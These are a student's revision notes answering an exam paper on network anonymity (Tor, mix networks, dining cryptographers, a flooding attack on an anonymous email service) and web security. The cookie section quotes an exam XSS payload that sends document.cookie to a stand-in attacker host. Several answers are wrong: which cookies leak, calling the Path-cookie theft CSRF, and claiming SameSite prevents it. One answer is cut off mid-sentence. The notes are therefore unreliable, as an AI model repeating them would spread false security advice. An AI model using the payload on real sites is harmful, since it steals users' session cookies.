---
tags:
  - uni
  - sem1
---
[[Revision Home|Back to Revision Home]]
[[May '23.pdf|Paper PDF]]
[[May '23 scratchpad]]

# Network Security and Anonymity
## a)
We discussed different types of IP-layer attacks on traffic as it traverses the network, such as Wiretapping, Spoofing, Tampering, and DoS. Give a description of each of the 4 attacks named above and provide at least 3 reasons for what renders these attacks possible. Assume that no protections are in place to mitigate these named attacks. *\[5 marks]*

**Wiretapping** - wiretapping is the process of obtaining the message sent from a client to the server. The server still receives the message, but the attacker also receives the message. This can be done in two ways: 
- either the attacker receives a copy of the message
- the attacker receives the original message before the server, reads it, then forwards the client's message onto the server

**Spoofing** - The attacker sends a *forged* message to the server in such a manner that the server believes it came from the client. The client is not directly informed that any of this is taking place

**Tampering** - The client sends a message to the server, but it is *intercepted* by the attacker before it can reach the server. The attacker then modifies the message contents, and sends this to the server. The server believes this modified message is the original one from the client.

**DoS** - A Denial of Service attack is simple - the attacker somehow stops the client's message(s) from reaching the server.

<u>Reasons that make this possible</u>
**Lack of encryption** - if the messages were encrypted in such a way only the client and server could read them, then this would render three of the four attacks (not including *DoS*) useless. Wiretapping as the attacker could not gain any valuable information from the data sent, and spoofing/tampering due to the attacker being unable to insert their own plaintext data into the message if they do not know how the encryption works. Unencrypted (as this scenario is), the attacker can do all of this

**Authentication of sender** - if there is some method (such as signatures) to ensure where a message is coming from, this would render the attacks that modify the message useless. The attacker would be unable to "pose" as the original client and the server would detect this message as not legitimate in some way, and be able to inform the client somehow

**Authentication the message has not been tampered** - Methods to ensure the message is received in it's original form (e.g. parity bits, Hamming codes, signature algorithms that take in part the message contents). If these are enabled, the server can see if the message has been altered and reject it outright.

**Simple channels of communication** - by using more node-based networks such as crowds or TOR, an attacker can find it hard to intercept a message as they are unsure what route it will take through the network. This method, unlike the other 3 listed, will also stop DoS attacks, and provides strong (but not as strong) defense against the other attacks, since these involve the attacker being able to intercept the message. To prevent these, the other techniques should be used

## b)
We looked at the Three Dining Cryptographers (3DC) protocol which can be used to tell whether one of the diners has paid for the meal. For this question, we add one more party for 4DC (A, B, C, and D). (NOTE: Use the binary XOR operator, such that A ⊕ B ⊕ C = (A ⊕ B) ⊕ C is satisfied. 

The following coin flips are observed by each pair of parties (Heads=1, Tails=0):
AB:1, AC:1, AD:0, BC:1, BD:0, CD:1. 

The following announcements are made by each party: A:0, B:0, C:1, D:0. 

The completion of the protocol yields a result of 1. Using the information given in this question, is it possible to work out who paid for the meal? If yes, then was it A, B, C, D, or the NSA? Show your work. 

*I had to look up [[Secure Communications#3DC Protocol|nDC]] for this*

Important note: ![[Secure Communications#Phase 2]]
D paid
- The protocol resulted in 1, meaning *a cryptographer paid*
- D is the only participant who announced *the negation of their $\oplus$*
## c)
Describe how Mix networks differ from Tor in terms of the kind of adversary they protect against, their performance differences, and what, if any, role dummy messages play in either. *\[5 marks]*

<u>Adversaries they protect against</u>
TOR protects against adversaries who aim to find out *who* a message is coming from. It does this by making each message go through a series of relays, who only know where next to send it. Even if an adversary can still eavesdrop on a message, they only know the last relay it came from - meaning they'd have to access the entry relay to find out who it was sent by, and the exit relay to find where it's going, which TOR makes impossible to find both for a message.

Mixnets differ slightly as while an adversary can possibly find where the messages are meant to be sent, they cannot find exactly which user has sent them. Even if they eavesdropped on all messages going into a mixnet, due to the mixing procedure, they would be unable to match these ingoing messages to outgoing messages. They could get a list of all messages in and all out, but advanced mixnets make this process a lengthy one and infeasible really.

<u>Performance differences</u>
TOR is really fast. The route is determined before the message is sent and by the client, so they can choose a fast efficient route through the network. As long as this route is followed, this is very direct through the relays. This timing can be exploited by an adversary however, since they can tag messages and measure times through the network.

Mixnets by design are much slower. The pool of messages to be sent sometimes needs to be large enough to begin sending any of them in any order. There is no guarantee at what time your message will be sent, or that it will be sent in a timely manner at all. Many mixnets usually feature several mixes, which further exascerbates this problem. This prevents adversaries running time analyses on these messages.

<u>Dummy messages</u>
Dummy messages are used in mixnets to great degree. Adding in dummy messages means a mixnet can potentially output more messages than were inputted to it, and if these are encrypted an adversary cannot tell if a message leaving a mixnet is a dummy or not. Even if not, this can further exascerbate the time issue mentiomned earlier which further disadvantages the adversary

On TOR, these are less useful. This can further confuse an adversary although does not protect (single-handedly) against analysis of the real messages entering and exiting the network.
## d)
Sohail sets up a new anonymous email service called ZeroBits. This is how it works: 
- A user wants to send an email to someone they know. They produce the following message:
	- – To: recipient’s email address 
	- – From: user’s email address 
	- – Message: Hi there! 
- This message is encrypted using the ZeroBit public key and is sent to the ZeroBit email server. 
- The email server decrypts the email and replaces the From: address with a random address like so:
	- – From: random_number@zerobit.com 
- The ZeroBit email server records the original email address and the random email address in a mapping table like so:
	- – user’s email address: random_number@zerobit.com 
- The server then forwards the email to the intended recipient, encrypted with the recipients public key. It does not copy or log the contents of the messages. 
- To reply, the recipient sends the encrypted reply email to the random_number@zerobit.com address and the server looks up the original email address and forwards the email to the original sender, encrypted with the sender’s public key. Again the contents of the message are not recorded.

Given the above descriptions, answer the following
### i)
Are the recipients of replies anonymous? Explain. *\[3 marks]*

The `From` field is not changed to a random number, so ZeroBit will still be sending an email to plaintext recipient From plaintext sender. If an adversary can find who this

### ii)
Are the sender and recipient anonymous from the ZeroBit service? Explain why or why not. *\[3 marks]*

No. Ultimately, the ZeroBit service still stores the user's email address mapped to *one* random number. Even though ZeroBit does not track contents of the message, it can still tell that communication between two users - which it knows - is taking place. Since this number does not change, this is an identifier.

### iii)
Sohail decides to add email batching to the service to provide protection against global adversaries who can observe all network activity between the service and the senders and receivers. He decides that the server will wait until 105 emails have been received before sending them all out together. Describe what sort of attack the adversary can still mount to reveal which senders and recipients are communicating together. Assume that the adversary is able to add, drop, slow down, or change any message on the network. Provide a description of the various stages of the attack and how the adversary ensures the results. *\[6 marks]*

The attack is dependant on the adversary knowing that 105 messages is a constant on the server. The attack involves the adversary sending 104 messages of their own, and then working out the random numbers associated with a user.

1. The adversary tracks when a user on a compromised network sends an email to ZeroBit
2. The adversary immediately sends 104 emails to ZeroBit, dropping any other connections from the network to ensure they control 104/105 of these messages
3. All of these messages contain the adversary's own email as a recipient.
4. The adversary then checks to see the next messages that enter the network from ZeroBit, all 105 of them (since the recipient is on the same server).
5. These will all be of the form `random_number@zerobit.com`
6. The adversary can tell which of these are their own random number, and the one that isn't is the random number of that user.

The adversary can run this attack any time a email is sent to ZeroBit from a user with an unknown random number, to build up a local copy of the mapping table ZeroBit uses. Later, they can basically translate the zerobit emails to normal "A -> B" messages.
# Internet Cookies and Same Origin Policy
## a)
Explain how "origins" in the web browser and "processes" in operating systems are conceptually similar.

They are both "instances" of the same "resource", which can differ in capabilities depending on "who uses them".
Processes are instances of the same program - depending on who launches one, it can have different permissions when performing operations. 
Origins are where the original resource was invoked from - depending on the policies enacted by the website, they can have different permissions in what operations they can perform.

## b)
`AcmeBook` is a social media website that allows users to make posts which are hosted on `AcmeBook` servers

Assume *Mallory* makes the following post on `AcmeBook`:
```html
<script src="http://mallory.com/do.js"></script>
```
where `http://mallory.com` is a page controlled by *Mallory*. Also assume `AcmeBook` does not sanitise user inputs. What happens if *Alice* views *Mallory's* post? Justify your answer and in particular include what applies in terms of the [[Web Security#Same Origin Policy|Same Origin Policy]]

*I had to look up the [[Web Security#Same Origin Policy|Same Origin Policy]] for this one*

*Alice's* browser **will** run the script. It cannot access the source of `AcmeBook`, but it will run the script nonetheless - this is the extent of protection Same Origin Policy provides.

## c)
Assume now that *Mallory* makes the following post:
```html
<script src="http://mallory.com/do?token="
									+ document.cookie></script>
```
where `http://mallory.com/do` is a page controlled by *Mallory* that stores the URL query parameters in a database. And assume `AcmeBook` does not sanitise user inputs. If *Alice* views *Mallory's* post, which of the following cookies get sent to `mallory.com`?

| Domain         | Path  | `HTTPOnly` | `Secure` |
| -------------- | ----- | ---------- | -------- |
| `mallory.com`  | `/`,  | True       | False    |
| `mallory.com`  | `/do` | False      | False    |
| `mallory.com`  | `/do` | True       | True     |
| `acmebook.com` | `/do` | True       | False    |
| `acmebook.com` | `/`   | False      | False    |
| `acmebook.com` | `/`   | False      | True         |

*I had to look up both [[Web Security#`HTTPonly` Cookies|HTTPOnly]] and [[Web Security#`Secure` cookies|Secure Cookies]] for this*
![[Web Security#`HTTPonly` Cookies]]
![[Web Security#`Secure` cookies]]

Due to `HTTPOnly` the script cannot send i, iii, or iv
Due to `Secure`, and the fact the url is not `HTTPS`, vi cannot be sent
Only ii and v remain.

Due to SOP, only ii will be sent over.
## d)
Which attack has *Mallory* executed with the above post? Explain how this attack works.

*Mallory* has executed a Cross-Site Scripting attack. *Alice* trusts `AcmeBook` and by exploiting this, Mallory is able to run malicious scripts from an untrusted website on *Alice* since the browser will load these scripts without proper protections.

## e)
`AcmeHosting` provides a website creation service. *Alice* has built a personal site hosted at `https://acmehosting.com/alice`. *Alice* allows access to certain pages of her site only to specific authenticated users. *Charlie* is one such priviledged user. Once a user (e.g. Charlie) successfully logs in, the server sends a response with a `Set-Cookie` `HTTP` header to set a `sessionID` cookie in the user’s browser.
```php
Set-Cookie: sessionId={{random session ID}}; Path=/alice
```
Alice is specifying the `Path` attribute on the cookie so that the cookie is scoped to the path prefix ”`/alice`”. This means that the cookie will be sent when the authenticated user (e.g. Charlie) visits `https://acmehosting.com/victim` or `https://acmehosting.com/alice/restricted_page` but not when they visit `https://acmehosting.com/mallory`.

Explain how *Mallory* who controls ` https://acmehosting.com/mallory` can read Charlie's `sessionID` for Alice's website and access Alice's restricted pages even though she is not one of *Alice's* privileged users.

Mallory can perform a CSRF attack to get the session ID cookie, which she can then forge as her own and access Alice's site with it.

To perform this, Charlie must already have a current valid session cookie with Alice's site. Mallory can then insert a hidden form which will send the current cookies to her, and if Charlie visits Mallory's site, their browser will execute this script and send over all cookies.

This attack works because the server sends Charlie a valid cookie for Alice *when he logs in*, not just when he wants to visit Alice's site. Hell, this way Mallory could get access to all sites Charlie's authenticated to visit! This will only be valid for Mallory while Charlie is logged in - assuming the server invalidates these cookies on logout, as is customary. If not - this will be valid until he logs back in. If this isn't even reset, then what's the point in a random session ID anyway?

## f)
What cookie attribute could Alice specify when setting the cookie that would have prevented the attacker from stealing the `sessionId` cookie? Justify your answer. 

`SameSite`. This stops any cookies for `/alice` going to `/mallory`.

## g)
Is adding this attribute enough to prevent Mallory (who controls `https: //acmehosting.com/mallory`) from reading the content of Alice’s restricted pages? If yes, explain why. If not, explain how the attacker site can still access the restricted pages. 

Yes. There's no other method of forging this cookie so stealing it is the only option. This `SameSite` attribute will only work if Mallory controlled a *subpage* of Alice's page, as it will only work from things sent from the `Path=/alice`.